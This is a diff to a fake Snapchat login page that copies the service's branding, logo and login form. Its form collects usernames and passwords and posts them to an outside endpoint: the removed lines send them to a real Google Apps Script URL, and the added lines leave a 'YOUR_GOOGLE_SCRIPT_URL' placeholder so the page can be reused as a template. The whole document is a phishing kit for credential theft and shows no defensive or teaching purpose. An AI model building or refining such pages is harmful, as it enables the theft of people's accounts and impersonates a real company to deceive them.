@@ -1,47 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Snapchat Login</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Snapchat</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="1234.jpg" type="image/jpeg" />
+
+  <!-- Styling -->
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
     body {
-      background-color: #FFFC00;
+      background-color: #fffc00;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      font-family: Arial, sans-serif;
     }
-    .login {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      width: 300px;
+
+    .login-container {
+      background-color: white;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.1);
+      padding: 40px 30px;
+      width: 320px;
       text-align: center;
     }
-    input {
-      width: 90%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+
+    .logo {
+      margin-bottom: 25px;
     }
-    button {
-      background-color: #FFFC00;
+
+    .logo img {
+      width: 60px;
+      border-radius: 12px;
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      font-size: 24px;
+      color: #000;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+
+    input[type="submit"] {
+      background-color: #fffc00;
       border: none;
-      padding: 10px 20px;
+      border-radius: 10px;
+      padding: 12px;
       font-weight: bold;
-      border-radius: 5px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #e5da00;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
     }
   </style>
 </head>
 <body>
-  <form method="POST" action="https://script.google.com/macros/s/AKfycbzJ-I68JVzs-E6W2iEfCse9OZEqoEB4wWBHSSbMOMr0fSq5R947-1ZYoMnTJq_vY1qb/exec">
-    <h2>Snapchat Login</h2>
-    <input type="text" name="username" placeholder="Username or Email" required><br>
-    <input type="password" name="password" placeholder="Password" required><br>
-    <button type="submit">Login</button>
-  </form>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="1234.jpg" alt="Snapchat Logo">
+    </div>
+    <h2>Log In to Snapchat</h2>
+    <form method="POST" action="YOUR_GOOGLE_SCRIPT_URL">
+      <input type="text" name="username" placeholder="Username or Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="submit" value="Log In">
+    </form>
+    <div class="footer">
+      New to Snapchat? <a href="#">Sign up</a>
+    </div>
+  </div>
+
 </body>
 </html>
